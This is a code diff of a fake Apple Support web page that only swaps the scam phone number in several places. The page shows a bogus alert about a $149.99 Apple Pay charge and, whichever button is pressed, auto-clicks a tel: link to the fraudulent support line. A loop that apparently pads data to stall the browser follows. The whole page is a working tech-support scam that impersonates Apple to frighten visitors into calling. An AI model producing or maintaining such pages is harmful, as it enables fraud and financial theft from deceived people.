@@ -144,7 +144,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-866-381-6140 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1-877-481-2949 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
@@ -220,7 +220,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name">
-                <meta content="+1-866-381-6140
+                <meta content="+1-877-481-2949
 			 " property="telephone">
             </section>
         </div>
@@ -287,7 +287,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-866-381-6140');
+        window.number = (window.number ? window.number : '+1-877-481-2949');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -345,7 +345,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-381-6140"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-481-2949"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -362,7 +362,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-381-6140 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-877-481-2949 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
